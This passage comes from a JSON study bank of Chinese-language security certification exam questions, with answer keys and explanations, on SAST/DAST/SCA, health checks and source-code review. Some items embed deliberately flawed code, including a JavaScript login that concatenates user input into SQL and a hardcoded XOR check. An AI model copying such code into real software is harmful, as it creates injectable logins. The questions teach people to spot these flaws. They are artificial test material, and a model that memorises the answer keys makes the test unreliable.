     "answer": [
      0,
      1,
      2
     ],
     "hint": "回想滲透測試、源碼檢測、資安健診各自的目的與範圍，逐項判斷每句是否正確。",
     "explanation": "答案 A、B、C。A 滲透測試模擬攻擊者實際入侵行為，用以驗證弱點能否在真實環境被成功利用；B 資安健診著重組織整體防護機制與管理流程，屬策略與制度層級的安全檢視；C 源碼測試能在不實際攻擊系統的情況下檢視設計與實作的潛在缺陷。D 錯誤：完成源碼測試不能取代滲透測試與資安健診，三者各有不同重點。",
     "source": "115-1 第32題"
    },
    {
     "stem": "應用程式安全測試若僅依賴自動化工具進行的成效通常有其侷限，下列描述何者最正確？",
     "options": [
      "自動化工具可檢測常見問題，但對客製化商務邏輯了解有限而可能產生許多誤報",
      "自動化工具的軟體授權成本較高，因此人工測試更具成本效益",
      "自動化工具只能在應用程式處於運行狀態時執行，無法進行靜態程式碼分析",
      "應用程式安全測試的報告無法由工具自動生成，必須由人工完成"
     ],
     "answer": 0,
     "hint": "回想自動化安全測試工具的能力與限制，逐項判斷每句是否正確。",
     "explanation": "答案 A。自動化工具擅長找常見問題，但對客製化商務邏輯的理解有限，也容易產生誤報，因此成效有侷限。B 說授權成本高所以人工更具成本效益，沒有依據；C 說自動化工具只能在運行時執行、無法靜態分析，與事實不符（SAST 就是靜態分析）；D 說報告無法由工具自動生成，也不正確，許多工具可自動產生報告。",
     "source": "114-2 第30題"
    },
    {
     "stem": "一家金融科技公司委託資安廠商對其新上線的行動銀行 App 進行一次完整的資安檢測。為了徹底評估其防護能力，下列何項作業較「不」屬於安全檢測項目？",
     "options": [
      "執行滲透測試（Penetration Testing），模擬駭客從外部嘗試入侵 App 與後端伺服器",
      "進行原始碼檢測（Source Code Review），找出應用程式邏輯與編碼層面的安全漏洞",
      "對其使用的雲端平台環境進行雲端安全配置檢視（Cloud Security Posture Management, CSPM）",
      "針對 App 安裝檔（.apk / .ipa）進行逆向工程"
     ],
     "answer": 3,
     "hint": "回想完整行動 App 資安檢測常見的項目，逐項判斷；本題另有答案給分，答完請看解析。",
     "explanation": "答案 D（官方公告：答 C 也給分）。官方採 D「針對 App 安裝檔（.apk／.ipa）進行逆向工程」為較不屬於安全檢測的項目，官方未說明理由；要注意一般行動 App 資安檢測（例如 OWASP MASTG）常把逆向分析列為檢測手法之一，這題的判斷與一般實務有落差，作答以官方答案為準。C 對雲端平台做安全配置檢視（CSPM），官方公告答 C 也給分，官方未說明理由。A 滲透測試模擬駭客入侵 App 與後端伺服器、B 原始碼檢測找邏輯與編碼層漏洞，都是完整資安檢測的常見項目。",
     "source": "114-2 第31題"
    },
    {
     "stem": "情境如附圖所示。上線前可以進行滲透測試、弱點掃描、源碼檢測，三者發現的弱點數量與誤判率比較的敘述，下列何者較為正確？",
     "options": [
      "發現率最高的是滲透測試",
      "誤判率最高的是滲透測試",
      "通常發現數量以原始碼檢測最高",
      "原始碼檢測可以找出商業邏輯問題"
     ],
     "answer": 2,
     "context": "【題組 4】\nA 企業推出長照媒合線上服務，其資訊架構包含 Web 及 mobile app 等，後端採用 MySQL 資料庫。其架構有切割出 API 伺服器及資料庫伺服器。",
     "hint": "把三種方法依『數量』『誤判』『能找到的問題種類』三個面向各排一次，再檢查哪一句的排序與實際相符。",
     "explanation": "答案 C。實務上通常是源碼檢測發現的弱點數量最多（但誤報也多）。A 發現率最高的是源碼檢測，不是滲透測試；B 滲透測試是實際驗證弱點能否被利用，誤判率最低，不是最高；D 商業邏輯問題通常需要滲透測試與人工分析才能找出，單靠原始碼檢測工具難以發現。",
     "source": "112-2 第33題"
    }
   ]
  },
  {
   "id": "2.2-04",
   "section": "2.2",
   "title": "SAST／DAST／SCA 工具選用",
   "examHits": 9,
   "examRefs": [
    "115-2 第37題",
    "115-2 第38題",
    "115-2 第39題",
    "114-2 第37題",
    "113-2 第5題",
    "112-2 第30題",
    "112-1 第30題",
    "111-1 第15題",
    "108-1 第3題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "選工具先看風險發生在哪一層。要盤點開源套件、找出已知漏洞與惡意相依套件，並產生可追溯的元件清單（SBOM），用 SCA（軟體組成分析）；金鑰、憑證被寫死在程式碼（hardcode），要用祕密掃描（Secret Scanning），並依『左移』原則放在 pre-commit hook 與 CI 階段，設成品質關卡擋掉含金鑰的提交；只在執行期才出現的驗證繞過、越權存取（IDOR）要用 DAST／API 安全測試，並以滲透測試驗證可利用性；要在 CI/CD 提早發現程式碼弱點，用 SAST。Fortify 這類是靜態分析，不是動態；Nessus 做系統弱點評估、Acunetix 做網站弱點評估、Nmap 可做網路設備探測。",
   "keyPoints": [
    "看到『相依套件被植入惡意程式／要盤點元件、產出 SBOM』→ SCA；不是 DAST，也不是 SAST。",
    "看到『金鑰、憑證寫死在版控』→ 祕密掃描整合 pre-commit hook＋CI 並設品質關卡（左移）；事後 DAST 或季度人工審查都太慢。",
    "看到『只在執行期才浮現的驗證繞過／IDOR』→ DAST／API 安全測試＋滲透測試驗證；SAST、SCA、SBOM 看不到執行期行為。",
    "看到『要整合到 CI/CD 提早發現原始碼弱點』→ SAST（靜態應用安全測試）。",
    "工具屬性別混淆：Fortify（SCA/SAST 類，靜態）≠ 動態分析；Nessus＝系統弱點評估；Acunetix＝網站弱點評估。"
   ],
   "trap": "把 SAST、DAST、SCA 的適用場景對調：以為 SAST 能找出執行期弱點、以為 DAST 能盤點相依套件、或把 Fortify 當成動態分析工具。",
   "quiz": [
    {
     "stem": "情境如附圖所示，針對工程師引入的開源套件中「間接相依套件被植入惡意程式碼」的問題。若希望最有效地盤點相依元件、辨識已知漏洞與惡意套件，建立可追溯元件清單，下列哪一項安全測試元件最為適切？",
     "options": [
      "DAST動態應用程式安全測試，於執行期間追蹤並盤點相依套件的異常行為",
      "軟體供應鏈黑箱滲透測試，模擬攻擊探測以羅列第三方元件的已知漏洞",
      "SCA軟體組成分析，並產出SBOM（軟體物料清單）",
      "SAST靜態應用程式安全測試，掃描專案原始碼以建立開源套件弱點清單"
     ],
     "answer": 2,
     "context": "2026 年 3 月，在科學園區的「K 半導體」是一家專攻 AI 加速器晶片的 IC 設計公司，客戶涵蓋國防、車用與雲端。某週一清晨，資安團隊告警平台出現一連串異常：公司內部設計驗證 CI/CD 在凌晨向一個從未見過的境外網域發出了多次連線。\n\n公司資安中心隨即介入，攤開這場整起事件，發現是一場精心設計、橫跨「軟體供應鏈」與「硬體設計鏈」的複合式攻擊活動，發現：\n1. 工程師為加速驗證流程，從開源平台引入 Python 自動化套件，其中一個間接相依套件被植入惡意程式碼進行竊取。\n2. 進一步檢視版本控制庫，發現開發者把某客戶晶圓代工廠的 API 金鑰與 GDSII 簽章憑證直接 hardcoded 在程式碼裡，等同鑰匙插在門上。\n3. 攻擊者透過竊取的憑證，潛入跨國設計協作公司網站，利用只在應用程式執行時才會浮現的 AP 驗證繞過弱點，存取了不該被存取資料。\n4. 最棘手是鑑識團隊在一採用第三方 IP（IP 指 Intellectual Property 矽智財，非網路 IP）模組，發現一段以 AI 生成、潛伏能觸發的 hardware Trojan。被植入在 RTL 設計階段，傳統的軟體源碼掃描完全無法察覺它。\n\n公司高層要求安全團隊不只「滅火」，更要提出一套整合各類安全測試元件的縱深防禦方案。依據上述事件情境，請回答下列問題：",
     "hint": "逐項回想每種測試工具的功能與產出，判斷哪一個最符合題目的三個需求。",
     "explanation": "答案 C。問題是『間接相依套件被植入惡意程式』，目標是盤點相依元件、辨識已知漏洞與惡意套件並建立可追溯清單，最適合的是 SCA（軟體組成分析）並產出 SBOM。A DAST 在執行期測試應用，不是用來盤點相依套件；B 黑箱滲透測試可探測風險，但不是系統性盤點元件的方法；D SAST 掃描的是自家專案原始碼，不是為了盤點第三方開源套件與其漏洞。",
     "source": "115-2 第37題"
    },
    {
     "stem": "情境如附圖所示，針對「晶圓代工廠 API 金鑰與 GDSII 簽章憑證被硬編碼（hard coded）於版控庫」的問題，依「左移（shift-left）」原則，下列哪一種整合方式最能在問題擴散前預先攔截？",
     "options": [
      "等正式環境部署後，以DAST對執行中的服務進行掃描",
      "維持每季一次的人工程式碼審查，由資深工程師逐行檢視",
      "待滲透測試報告交付後，再依建議逐項修補",
      "將祕密掃描（Secret Scanning）整合至 pre-commit hook 與 CI 階段，並設為品質關卡（quality gate），阻擋含金鑰的提交進入版控"
     ],
     "answer": 3,
     "context": "2026 年 3 月，在科學園區的「K 半導體」是一家專攻 AI 加速器晶片的 IC 設計公司，客戶涵蓋國防、車用與雲端。某週一清晨，資安團隊告警平台出現一連串異常：公司內部設計驗證 CI/CD 在凌晨向一個從未見過的境外網域發出了多次連線。\n\n公司資安中心隨即介入，攤開這場整起事件，發現是一場精心設計、橫跨「軟體供應鏈」與「硬體設計鏈」的複合式攻擊活動，發現：\n1. 工程師為加速驗證流程，從開源平台引入 Python 自動化套件，其中一個間接相依套件被植入惡意程式碼進行竊取。\n2. 進一步檢視版本控制庫，發現開發者把某客戶晶圓代工廠的 API 金鑰與 GDSII 簽章憑證直接 hardcoded 在程式碼裡，等同鑰匙插在門上。\n3. 攻擊者透過竊取的憑證，潛入跨國設計協作公司網站，利用只在應用程式執行時才會浮現的 AP 驗證繞過弱點，存取了不該被存取資料。\n4. 最棘手是鑑識團隊在一採用第三方 IP（IP 指 Intellectual Property 矽智財，非網路 IP）模組，發現一段以 AI 生成、潛伏能觸發的 hardware Trojan。被植入在 RTL 設計階段，傳統的軟體源碼掃描完全無法察覺它。\n\n公司高層要求安全團隊不只「滅火」，更要提出一套整合各類安全測試元件的縱深防禦方案。依據上述事件情境，請回答下列問題：",
     "hint": "回想「左移」的意義，逐項判斷每種做法能否在問題擴散前攔截。",
     "explanation": "答案 D。依左移原則，要在問題擴散前攔截，就把祕密掃描整合到 pre-commit hook 與 CI 階段，並設為品質關卡，阻擋含金鑰的提交進入版控。A 等部署後才用 DAST 掃描，金鑰早已進入版控；B 每季一次人工逐行審查，間隔太長；C 等滲透測試報告交付後才修補，同樣太晚。",
     "source": "115-2 第38題"
    },
    {
     "stem": "情境如附圖所示，跨國設計協作入口網站的REST API存在「驗證繞過／越權存取（IDOR）」弱點，此弱點僅在應用程式「執行期」才會顯現，靜態原始碼掃描並未發現。下列哪一種測試方式最適合用來偵測並驗證這類執行期弱點？",
     "options": [
      "產出完整的 SBOM 軟體物料清單，全面盤點系統架構與第三方 API 模組的存取風險",
      "DAST / API安全測試，並以滲透測試實際驗證可利用性",
      "執行 SCA 軟體組成分析，比對最新漏洞庫以揪出 API 框架中潛藏的已知驗證缺失",
      "整合進階SAST靜態程式碼掃描，透過深度資料流分析找出API的越權驗證漏洞"
     ],
     "answer": 1,
     "context": "2026 年 3 月，在科學園區的「K 半導體」是一家專攻 AI 加速器晶片的 IC 設計公司，客戶涵蓋國防、車用與雲端。某週一清晨，資安團隊告警平台出現一連串異常：公司內部設計驗證 CI/CD 在凌晨向一個從未見過的境外網域發出了多次連線。\n\n公司資安中心隨即介入，攤開這場整起事件，發現是一場精心設計、橫跨「軟體供應鏈」與「硬體設計鏈」的複合式攻擊活動，發現：\n1. 工程師為加速驗證流程，從開源平台引入 Python 自動化套件，其中一個間接相依套件被植入惡意程式碼進行竊取。\n2. 進一步檢視版本控制庫，發現開發者把某客戶晶圓代工廠的 API 金鑰與 GDSII 簽章憑證直接 hardcoded 在程式碼裡，等同鑰匙插在門上。\n3. 攻擊者透過竊取的憑證，潛入跨國設計協作公司網站，利用只在應用程式執行時才會浮現的 AP 驗證繞過弱點，存取了不該被存取資料。\n4. 最棘手是鑑識團隊在一採用第三方 IP（IP 指 Intellectual Property 矽智財，非網路 IP）模組，發現一段以 AI 生成、潛伏能觸發的 hardware Trojan。被植入在 RTL 設計階段，傳統的軟體源碼掃描完全無法察覺它。\n\n公司高層要求安全團隊不只「滅火」，更要提出一套整合各類安全測試元件的縱深防禦方案。依據上述事件情境，請回答下列問題：",
     "hint": "回想各類測試的執行時機與能找到的弱點類型，逐項比對題幹描述。",
     "explanation": "答案 B。IDOR／驗證繞過這類弱點只在應用程式執行期才會顯現，靜態掃描發現不了；適合用 DAST／API 安全測試，並以滲透測試實際驗證可利用性。A SBOM 是元件清單，不是偵測執行期漏洞的測試；C SCA 比對的是已知漏洞庫，不能找出客製邏輯的驗證缺失；D 即使進階 SAST 也是靜態分析，難以發現只在執行期才呈現的驗證繞過。",
     "source": "115-2 第39題"
    },
    {
     "stem": "情境如附圖所示。你需協助開發團隊建立自動化原始碼檢測機制以提前發現弱點，請問考量 DevSecOps 的精神。下列何種技術最適合整合至 CI/CD 工作流程中？",
     "options": [
      "靜態應用安全測試（Static Application Security Testing, SAST）",
      "SQL 資料表比對工具",
      "黑箱測試（Black-box Testing）",
      "動態應用安全測試（Dynamic Application Security Testing, DAST）"
     ],
     "answer": 0,
     "context": "你受聘為「超好用科技股份有限公司」的資安顧問，協助執行其年度資訊安全強化計畫。該公司目前正導入 DevSecOps 實踐，並預定完成以下三項目標：\n1. 對旗下新開發的 ERP-Web 系統執行全面「原始碼檢測」與「滲透測試」；\n2. 執行一次針對雲端主機與內部網段的「資安健診」作業；\n3. 建立跨部門的風險評估與弱點修補作業流程，以提升資安治理成熟度。\n\n在測試與健診過程中，團隊發現若干高風險弱點與不當配置，例如：缺乏原始碼檢測、程式碼包含敏感資訊、驗證缺陷等。你需依據檢測結果，提出分析報告、優先順序、工具選用建議，以及內部控制對策，並向董事會報告成果。",
     "hint": "回想 DevSecOps 的精神，逐項判斷每種技術整合進 CI/CD 的可行性。",
     "explanation": "答案 A。要整合到 CI/CD、在開發階段提前發現原始碼弱點，適合的是 SAST（靜態應用安全測試），可在提交或建置時自動掃描。B SQL 資料表比對工具與原始碼弱點檢測無關；C 黑箱測試需要運行中的系統與人工，較不易自動整合；D DAST 需要運行環境，通常在部署後或測試環境階段。",
     "source": "114-2 第37題"
    },
    {
     "stem": "情境如附圖所示，依據公司高層的要求，工程師正評估採用「弱點評估」工具來評估公司內部潛在的弱點項目，試問下列有關「弱點評估」之敘述，下列何者「有誤」？",
     "options": [
      "可使用 Nessus Professional 工具來進行系統弱點評估",
      "可使用 Acunetix 工具來進行網站弱點評估",
      "可使用 Fortify SCA 動態原始碼檢測分析工具來進行軟體系統之原始碼弱點評估",
      "可使用 Nmap 工具來進行網路設備弱點評估"
     ],
     "answer": 2,
     "context": "公司因供應鏈之客戶要求在執行受託業務時，必須針對所承接之受託業務有關的資訊安全有所作為，因此公司高層下令有關人員針對公司在執行受託業務上可能面臨的資訊安全風險議題進行研議。",
     "hint": "逐項回想每個工具的類型與用途，判斷描述是否正確。",
     "explanation": "答案 C（有誤的敘述）。Fortify SCA（Static Code Analyzer）是靜態原始碼分析工具，並不是『動態』原始碼檢測工具，題目敘述把它說成動態，所以有誤。A Nessus Professional 做系統弱點評估、B Acunetix 做網站弱點評估、D Nmap 可用來進行網路設備探測與弱點評估（以其腳本），官方視為正確。",
     "source": "113-2 第5題"
    }
   ]
  },
  {
   "id": "2.2-05",
   "section": "2.2",
   "title": "資安健診與 GCB",
   "examHits": 7,
   "examRefs": [
    "114-2 第32題",
    "113-2 第39題",
    "113-1 第30題",
    "112-2 第31題",
    "112-2 第36題",
    "111-1 第13題",
    "108-1 第8題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "資安健診是對組織資訊系統與網路環境做的全面普查，不是只做弱點掃描：內容包含網路架構檢視、網路惡意活動檢視（有線封包監聽分析）、使用者電腦與伺服器主機的惡意活動及更新檢視、目錄伺服器（AD）組態設定檢視、防火牆連線設定檢視等；核心活動是評估並識別系統中的潛在安全漏洞與不當配置。公部門常見的『政府組態基準（GCB）』是針對作業系統、瀏覽器等的組態設定檢視。若要在不影響資料庫運作的前提下做初步驗證，可以使用資安健診中的資料庫安全健檢（檢視組態與合規）而不是直接做滲透。國際上 SecurityScorecard 這類以外部情資探測與評分評估公司狀況的服務，官方也視為一種健診。",
   "keyPoints": [
    "資安健診 ≠ 只做弱點掃描；它是全面普查，涵蓋網路架構、惡意活動、使用者與伺服器、AD 組態、防火牆設定等多面向。",
    "GCB（政府組態基準）＝針對作業系統、瀏覽器等的『組態設定檢視』；『惡意活動設定檢視』不屬 GCB 類型。",
    "不能影響資料庫運作又要初步驗證合規 → 資料庫安全健檢（組態檢視），而非應用程式弱掃或滲透測試。",
    "健診最關鍵的活動 → 評估並識別系統中的潛在安全漏洞與不當配置；不是更新軟體、裝防毒、或監控員工社群。",
    "看到『外部廠商資安稽核』→ 屬稽核範疇，不是資安健診的檢視項目。"
   ],
   "trap": "把資安健診縮成弱點掃描，或把『更新軟體、裝防毒』這類對策當成健診的核心活動；另外 GCB 與『惡意活動檢視』也常被混為一談。",
   "quiz": [
    {
     "stem": "常見資安健診服務需求中，下列哪些選項適合公部門所需的政府組態基準（Government Configuration Baseline, GCB）的類型？",
     "options": [
      "作業系統組態設定檢視",
      "瀏覽器組態設定檢視",
      "資料庫組態設定檢視",
      "惡意活動設定檢視"
     ],
     "answer": [
      0,
      1
     ],
     "hint": "回想政府組態基準（GCB）涵蓋的類型，逐項比對；本題另有答案給分，答完請看解析。",
     "explanation": "答案 A、B（官方公告：答 A、B、C 也給分）。政府組態基準（GCB）是對作業系統、瀏覽器、應用程式等訂出的組態設定基準，A 作業系統組態設定檢視、B 瀏覽器組態設定檢視都屬之。C 資料庫組態設定檢視不在官方主答案內，但公告答 A、B、C 也給分，官方未說明理由。D「惡意活動設定檢視」屬於資安健診中的惡意活動檢視，不是組態基準。",
     "source": "114-2 第32題"
    },
    {
     "stem": "情境如附圖所示。當資料查核到資料庫時，發現資料庫有很大量的合規要求都沒有做到，但要調整設定必須在不影響資料庫的運作的前提下，確認資料庫是否安全，可以透過下列何種方法進行初步的驗證最為合適？",
     "options": [
      "以應用程式弱點檢測報告提交",
      "以資安健檢的資料庫安全健檢提交報告",
      "以滲透測試報告提交報告",
      "提交一份主機弱點檢測報告"
     ],
     "answer": 1,
     "context": "你是一間跨國企業的資安管理人員，你每一年都必須針對集團、子集團進行安全檢測與合規要求的驗證，在台灣由於集團參與了我國 A 級機關的軟體開發案，你必須針對組織的流程及服務進行合規的證明，你目前必須完成的包含有核心系統的滲透測試、採購的第三方套件商提供的源碼檢測報告及協助集團提交主要服務的系統開發流程的相關資安證明。",
     "hint": "先找出情境中的限制條件（不能影響運作、目標是資料庫），再比較哪一種檢測的範圍與侵入程度最符合。",
     "explanation": "答案 B。情境重點是資料庫合規要求大量未達成、但調整設定不能影響運作，需要先做初步驗證：使用資安健診中的資料庫安全健檢（檢視組態與合規要求）提交報告最合適。A 應用程式弱點檢測報告針對應用層，不是資料庫合規檢視；C 滲透測試是模擬攻擊，可能影響資料庫運作；D 主機弱點檢測針對主機層，不是資料庫組態。",
     "source": "113-2 第39題"
    },
    {
     "stem": "在進行資安健診時，檢測作業最關鍵的活動是下列何項？",
     "options": [
      "更新所有辦公軟體至最新版本",
      "監控社交媒體上員工的活動",
      "評估和識別系統中的潛在安全漏洞",
      "部署最新的防毒軟體"
     ],
     "answer": 2,
     "hint": "回想資安健診的定義與目的，逐項判斷每個活動是否為檢測作業的核心。",
     "explanation": "答案 C。資安健診是對環境做普查，最關鍵的檢測作業就是評估並識別系統中的潛在安全漏洞與不當配置。A 更新軟體、D 部署防毒是對策或防護作業，不是檢測；B 監控員工社群媒體活動與資安健診無關。",
     "source": "113-1 第30題"
    },
    {
     "stem": "關於資安健診的敘述，下列何者較「不」正確？",
     "options": [
      "一種對組織的資訊系統與網路環境進行全面普查的過程，以評估其對各種威脅的抵禦能力",
      "可以幫助企業或組織發現安全漏洞，增強企業對內外部威脅的抵禦能力",
      "國際知名的 SecurityScorecard 公司，通過完成對網路威脅情報探測的評分分析來評估公司實體的網絡安全狀況，也是一種資安健診",
      "僅透過弱點掃描手法完成資安健檢"
     ],
     "answer": 3,
     "hint": "回想資安健診的定義與範圍，逐項判斷每句是否正確。",
     "explanation": "答案 D（不正確的敘述）。資安健診是涵蓋多面向的普查，不是『僅透過弱點掃描手法』完成。A 為其定義、B 說明其效益、C 國際上 SecurityScorecard 以網路威脅情報探測評分評估企業狀況，官方視為是一種健診，皆為正確敘述。",
     "source": "112-2 第31題"
    },
    {
     "stem": "情境如附圖所示。資通安全健診除了網路架構檢視外，還包含下列哪些項目？",
     "options": [
      "網路惡意活動檢視（有線）封包監聽分析",
      "使用者電腦更新檢視",
      "外部廠商資安稽核",
      "目錄伺服器（AD）組態設定檢視"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "context": "【題組 4】\nA 企業推出長照媒合線上服務，其資訊架構包含 Web 及 mobile app 等，後端採用 MySQL 資料庫。其架構有切割出 API 伺服器及資料庫伺服器。",
     "hint": "回想資通安全健診的檢視項目，逐項比對。",
     "explanation": "答案 A、B、D。資通安全健診除了網路架構檢視外，還包含 A 網路惡意活動檢視（有線封包監聽分析）、B 使用者電腦更新檢視、D 目錄伺服器（AD）組態設定檢視。C 外部廠商資安稽核屬稽核，不是健診項目。（官方公告：只答 A、B 也給分，官方未說明理由）",
     "source": "112-2 第36題"
    }
   ]
  },
  {
   "id": "2.2-06",
   "section": "2.2",
   "title": "源碼檢測判讀",
   "examHits": 5,
   "examRefs": [
    "114-2 第29題",
    "114-1 第29題",
    "113-2 第33題",
    "112-2 第32題",
    "110-1 第13題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "源碼檢測判讀考的是『看到一段程式碼，能不能說出風險在哪』。常見問題：(1) SQL 以字串拼接而不是參數化查詢，屬於注入（OWASP Top 10:2021 的 A03；2025 版改列 A05）；(2) 程式碼用寫死的金鑰做簡單 XOR、反轉這類可逆運算再比對，不是真正的加密，攻擊者看原始碼就能還原；(3) 在 C# 使用 unsafe 並直接操作指標，可能造成緩衝區溢位；(4) 使用 PreparedStatement 與 setString 是預存式／參數化查詢的正確做法，註解的 FIXME 不等於硬編碼密碼。看原始碼題時要先弄清楚每個函式在做什麼（輸入來自哪裡、有沒有驗證、怎麼組成查詢、輸出到哪裡），再對到風險類別。",
   "keyPoints": [
    "看到 SQL 用字串相加把使用者輸入拼進去 → SQL Injection（OWASP 2021 版 A03、2025 版 A05），修補是參數化查詢。",
    "看到 PreparedStatement＋setString（以問號佔位）→ 參數化查詢，是安全寫法；FIXME 註解只是待辦，不是硬編碼密碼。",
    "看到 C# 的 unsafe 與指標操作 → 緩衝區溢位風險；遞迴缺終止條件會造成堆疊耗盡，並行存取造成競態，不是緩衝區溢位。",
    "看到程式用寫死的單一金鑰做 XOR、反轉再比對 → 這是可逆的簡單混淆而不是加密，金鑰在原始碼裡，容易被破解。",
    "判斷程式碼風險：先找輸入點、驗證點、輸出點，再對應 OWASP Top 10 類別（題目寫 2021 版就用 2021 編號；2025 版已重排，例如 Injection 由 A03 變 A05，並新增 A03 Software Supply Chain Failures）。"
   ],
   "trap": "把 XOR 這類可逆混淆當成真正的『加密』而忽略金鑰寫死的風險、把註解 FIXME 當成硬編碼密碼，或把遞迴溢位、多執行緒問題都叫緩衝區溢位。",
   "quiz": [
    {
     "stem": "如附圖所示是一段 Python 程式碼，你受聘於一個公司進行源碼檢測，需確認程式碼中是否隱藏潛在的惡意行為或漏洞。經分析發現，x() 函數對輸入執行了某種操作，並透過字串反轉進行額外處理。下列何項最正確地描述該程式碼的功能具有潛在風險？",
     "options": [
      "程式碼使用一種簡單 XOR 加密，有容易被破解的風險",
      "程式碼包含難以追蹤的邏輯漏洞，可能被用於後門驗證邏輯",
      "程式碼進行了無法逆向的加密方式，無法直接解密字串 SYP{txf_ofq}",
      "程式碼邏輯錯誤，t 的結果永遠無法等於 \"}afq{noT_SPY\""
     ],
     "answer": 0,
     "context": "def x(a):\n    b = \"\".join([chr(ord(c) ^ 0x42) for c in a])\n    return b[::-1]\n\ndef main():\n    s = \"SYP{txf_ofq}\"\n    t = x(s)\n    if t == \"}afq{noT_SPY\":\n        print(\"Access Granted\")\n    else:\n        print(\"Access Denied\")\n\nmain()",
     "hint": "逐行讀懂 x() 與 main() 做了什麼，再逐項判斷每個描述是否成立；本題官方答案與實際執行結果有落差，答完請看解析。",
     "explanation": "答案 A。程式用寫死的單一位元組金鑰 0x42 對每個字元做 XOR，再把結果反轉；金鑰與做法都寫在原始碼裡，只要再做一次相同運算就能還原，這是簡單可逆的混淆而不是真正的加密，容易被破解，也是源碼檢測要指出的風險，官方採 A。C 錯：XOR 可逆，不是「無法逆向」。B 官方不採：程式只有幾行、邏輯一眼可追，談不上「難以追蹤」。D 官方不採，但要注意：程式碼已對照原卷逐字核對，實際執行 x(\"SYP{txf_ofq}\") 得到的是一串含不可顯示字元的字串，不等於 \"}afq{noT_SPY\"；而 s 是寫死的常數，所以程式每次都只會印出 Access Denied，D 的字面敘述其實成立。官方未說明為何不選 D；可以這樣理解：題目問的是「具有潛在風險」的描述，D 講的是程式寫錯，不是資安風險（此為理解方式，非官方說明）。",
     "source": "114-2 第29題"
    },
    {
     "stem": "在 C#源碼檢測中，下列何種方法最有可能引起緩衝區溢位？",
     "options": [
      "使用 List<T> 類型的集合並頻繁添加元素",
      "在遞迴函數中未設置適當的退出條件",
      "使用不安全的程式模組並直接操作指標",
      "進行大量的非同步操作和多執行緒存取"
     ],
     "answer": 2,
     "hint": "回想緩衝區溢位的成因與 C# 的記憶體管理方式，逐項判斷每種做法的風險。",
     "explanation": "答案 C。在 C# 中使用不安全程式模組（unsafe）並直接操作指標，可繞過記憶體安全檢查，最可能引起緩衝區溢位。A List<T> 頻繁新增元素由執行階段管理容量，不會造成緩衝區溢位；B 遞迴缺少結束條件會導致堆疊溢位或資源耗盡，與緩衝區溢位成因不同；D 大量非同步與多執行緒存取主要引起競態條件，不是緩衝區溢位。",
     "source": "114-1 第29題"
    },
    {
     "stem": "情境如附圖所示。根據所發現的原始碼，除發現 logLoginAttemp 函數未實做而可能有 OWASP A09:2021-Security Logging and Monitoring Failures 風險，還有下列何項 OWASP Top 10:2021 風險最可能存在？",
     "options": [
      "A02:2021-Cryptographic Failures",
      "A03:2021-Injection",
      "A05:2021-Security Misconfiguration",
      "A06:2021-Vulnerable and Outdated Components"
     ],
     "answer": 1,
     "context": "你正在協助產品開發單位，對即將上線的電子商務網站進行安全測試，並且於於測試過程中發現一份 JavaScript 原始碼片段（如下圖），請指出這份原始碼所可能含有的安全問題並提供適當修補建議。\n\n// Advanced eCommerce Website User Login JavaScript Code\nfunction authenticateUser(username, password) {\n    const query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n}\n\nfunction logLoginAttempt(username, success) {\n    // Log login attempt, including username and success/failure\n}\n\napp.post('/login', function(req, res) {\n    let username = req.body.username;\n    let password = req.body.password;\n    let isAuthenticated = authenticateUser(username, password);\n\n    logLoginAttempt(username, isAuthenticated);\n    if (isAuthenticated) {\n        res.send('Login successful!');\n    } else {\n        res.send('Login failed!');\n    }\n});\n\nfunction verifyToken(token) {\n    // Verify the token's validity\n}\n\napp.post('/api/protected', function(req, res) {\n    let token = req.headers.authorization;\n    if (!verifyToken(token)) {\n        res.status(401).send('Unauthorized');\n        return;\n    }\n    // Protected API logic here\n});",
     "hint": "逐行讀懂程式碼，對照 OWASP Top 10:2021 各類別的定義，判斷最可能存在的風險。",
     "explanation": "答案 B。程式中以字串相加直接拼接 username 與 password 組成 SQL 查詢，屬於注入弱點，對應 OWASP Top 10:2021 的 A03:2021-Injection。A 圖中沒有加解密實作可直接判斷為加密失敗；C 沒有看到組態相關內容；D 圖中沒有元件版本資訊可判斷為過期元件。最明確、可直接從程式碼看出的是 SQL 字串拼接。",
     "source": "113-2 第33題"
    },
    {
     "stem": "關於附圖程式碼，下列敘述何者「不」正確？",
     "options": [
      "Hard-coded Password 為FIXME",
      "此程式碼語言為 Java",
      "prepareStatement 為預存式查詢",
      "setString為參數化查詢"
     ],
     "answer": 0,
     "context": "String firstname = req.getParameter(\"firstname\");\nString lastname = req.getParameter(\"lastname\");\n// FIXME: do your own validation to detect attacks\nString query = \"SELECT id, firstname, lastname FROM authors WHERE forename = ? and surname = ?\";\nPreparedStatement pstmt = connection.prepareStatement( query );\npstmt.setString( 1, firstname );\npstmt.setString( 2, lastname );\ntry\n{\n        ResultSet results = pstmt.execute( );\n}",
     "hint": "逐句對照程式碼片段：每個敘述是否真的能在圖中找到對應的程式碼？",
     "explanation": "答案 A（不正確的敘述）。圖中的 FIXME 註解寫的是『請自行做驗證以偵測攻擊』，提醒要做輸入驗證，並不是硬編碼密碼；程式碼中並沒有出現寫死的密碼。B 程式為 Java（String、PreparedStatement、req.getParameter）；C prepareStatement 即預存式（預先編譯）查詢；D setString 把參數綁定到查詢，為參數化查詢，皆正確。",
     "source": "110-1 第13題"
    }
   ]
  },
  {
   "id": "2.2-07",
   "section": "2.2",
   "title": "測試報告與弱點回報",
   "examHits": 5,
   "examRefs": [
    "114-2 第39題",
    "113-2 第37題",
    "112-2 第37題",
    "110-1 第34題",
    "109-1 第40題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "測試報告的讀者是高階管理人員與修補人員，所以報告要讓人能決策、能修補：包含範圍與方法論、測試人員背景與工具版本、弱點評估結果與評分方法、風險與修補建議、可重現的證據；弱點分級常用嚴重度（如 Critical、High、Medium、Low），技術細節不可省略。報告不重要的是測試耗時這類流程數據，且結論必須如實反映結果，不是迎合公司期望。收到第三方的源碼檢測報告，若只有版本、行數與雜湊、卻『零弱點』，要請對方提供檢測歷程（規則、範圍、紀錄）來證明確實有做，而不是直接轉交。滲透測試者回報可遠端執行指令的重大弱點時，即使在內部封閉測試期間，首要行動是先聯繫測試者釐清細節，再決定處置。",
   "keyPoints": [
    "報告內容重要性：弱點評估結果＋評分方法論＋分數＋修補建議（最重要）；測試人員背景與工具版本；『符合期望的結論』與『耗時』相對次要或不該迎合。",
